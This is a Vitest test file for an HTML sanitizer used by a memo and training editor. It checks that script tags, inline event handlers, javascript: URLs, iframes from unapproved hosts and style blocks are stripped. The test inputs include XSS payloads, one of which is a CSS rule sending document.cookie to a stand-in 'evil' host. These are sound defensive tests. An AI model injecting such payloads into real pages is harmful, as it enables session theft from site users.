import { describe, expect, it } from 'vitest'
import {
  sanitizeHtmlString,
  sanitizeMemoBlocks,
  sanitizeMemoHtml,
  sanitizeTrainingBlocks,
} from '../../src/lib/html-sanitize'

describe('sanitizeHtmlString — XSS defence', () => {
  it('strips <script> tags entirely', () => {
    const out = sanitizeHtmlString('<p>Hello</p><script>alert(1)</script>')
    expect(out).not.toContain('<script')
    expect(out).not.toContain('alert(1)')
    expect(out).toContain('<p>Hello</p>')
  })

  it('strips inline event handlers (onerror, onclick, onload, …)', () => {
    const payloads = [
      '<img src=x onerror="alert(1)">',
      '<a onclick="alert(2)" href="https://example.com">link</a>',
      '<div onload="alert(3)">x</div>',
      '<svg onload="alert(4)"></svg>',
    ]
    for (const p of payloads) {
      const out = sanitizeHtmlString(p)
      expect(out, `payload: ${p}`).not.toMatch(/\son\w+=/i)
      expect(out, `payload: ${p}`).not.toContain('alert(')
    }
  })

  it('rejects javascript: URLs on href and src', () => {
    const a = sanitizeHtmlString('<a href="javascript:alert(1)">x</a>')
    const img = sanitizeHtmlString('<img src="javascript:alert(2)">')
    expect(a).not.toContain('javascript:')
    expect(img).not.toContain('javascript:')
  })

  it('keeps safe http/https/mailto links', () => {
    const out = sanitizeHtmlString(
      '<a href="https://framada.app">site</a> <a href="mailto:hi@framada.app">mail</a>'
    )
    expect(out).toContain('href="https://framada.app"')
    expect(out).toContain('href="mailto:hi@framada.app"')
  })

  it('forces target=_blank links to carry rel="noopener noreferrer nofollow"', () => {
    const out = sanitizeHtmlString('<a href="https://example.com" target="_blank">x</a>')
    expect(out).toContain('rel="noopener noreferrer nofollow"')
    expect(out).toContain('target="_blank"')
  })

  it('only allows http/https in iframes from approved video hosts', () => {
    const ok = sanitizeHtmlString(
      '<iframe src="https://www.youtube.com/embed/abc123" width="560" height="315"></iframe>'
    )
    expect(ok).toContain('iframe')
    expect(ok).toContain('youtube.com')

    const bad = sanitizeHtmlString('<iframe src="https://evil.example.com/x"></iframe>')
    // sanitize-html drops iframes whose host isn't in the allowlist
    expect(bad).not.toContain('evil.example.com')
  })

  it('drops <style> and <link> blocks (CSS-based exfiltration vectors)', () => {
    const out = sanitizeHtmlString(
      '<style>body{background:url("//evil/?cookie=" + document.cookie)}</style><p>x</p>'
    )
    expect(out).not.toContain('<style')
    expect(out).not.toContain('evil')
    expect(out).toContain('<p>x</p>')
  })

  it('coerces non-string inputs to empty string', () => {
    expect(sanitizeHtmlString(null)).toBe('')
    expect(sanitizeHtmlString(undefined)).toBe('')
    expect(sanitizeHtmlString(123)).toBe('')
    expect(sanitizeHtmlString({})).toBe('')
    expect(sanitizeHtmlString('')).toBe('')
  })

  it('keeps formatting tags the memo editor produces', () => {
    const out = sanitizeHtmlString(
      '<p><strong>bold</strong> <em>italic</em> <u>under</u></p><ul><li>a</li></ul><h2>head</h2>'
    )
    expect(out).toContain('<strong>')
    expect(out).toContain('<em>')
    expect(out).toContain('<u>')
    expect(out).toContain('<ul>')
    expect(out).toContain('<h2>')
  })

  it('permits a whitelisted subset of inline styles only', () => {
    const out = sanitizeHtmlString(
      '<span style="color:#ff0000; background:url(javascript:alert(1)); text-align:center;">x</span>'
    )
    // color + text-align are whitelisted
    expect(out).toContain('color')
    expect(out).toContain('text-align')
    // background with url() is not in the allowlist — must be stripped
    expect(out).not.toContain('background')
    expect(out).not.toContain('javascript')
  })
})

describe('sanitizeMemoBlocks', () => {
  it('returns [] for non-array input', () => {
    expect(sanitizeMemoBlocks(null)).toEqual([])
    expect(sanitizeMemoBlocks(undefined)).toEqual([])
    expect(sanitizeMemoBlocks('nope')).toEqual([])
  })

  it('sanitises each block.content while preserving non-content fields', () => {
    const input = [
      {
        id: 'b1',
        type: 'section',
        title: 'Intro',
        content: '<p>ok</p><script>alert(1)</script>',
      },
      { id: 'b2', type: 'divider' },
    ]
    const out = sanitizeMemoBlocks(input) as Array<{
      id: string
      type: string
      title?: string
      content?: string
    }>
    expect(out).toHaveLength(2)
    expect(out[0].id).toBe('b1')
    expect(out[0].title).toBe('Intro')
    expect(out[0].content).toContain('<p>ok</p>')
    expect(out[0].content).not.toContain('<script')
    expect(out[1].type).toBe('divider')
  })

  it('leaves blocks without a string content field alone', () => {
    const input = [{ id: 'b1', type: 'divider' }]
    expect(sanitizeMemoBlocks(input)).toEqual(input)
  })
})

describe('sanitizeTrainingBlocks — alias of sanitizeMemoBlocks', () => {
  it('shares the same sanitisation pipeline', () => {
    const input = [
      { id: 'x', type: 'section', title: 't', content: '<img src=x onerror=alert(1)>' },
    ]
    const out = sanitizeTrainingBlocks(input) as Array<{ content: string }>
    expect(out[0].content).not.toContain('onerror')
  })
})

describe('sanitizeMemoHtml convenience wrapper', () => {
  it('delegates to sanitizeHtmlString for the memo content field', () => {
    expect(sanitizeMemoHtml('<p>x</p><script>y</script>')).not.toContain('<script')
    expect(sanitizeMemoHtml('<p>x</p><script>y</script>')).toContain('<p>x</p>')
  })
})
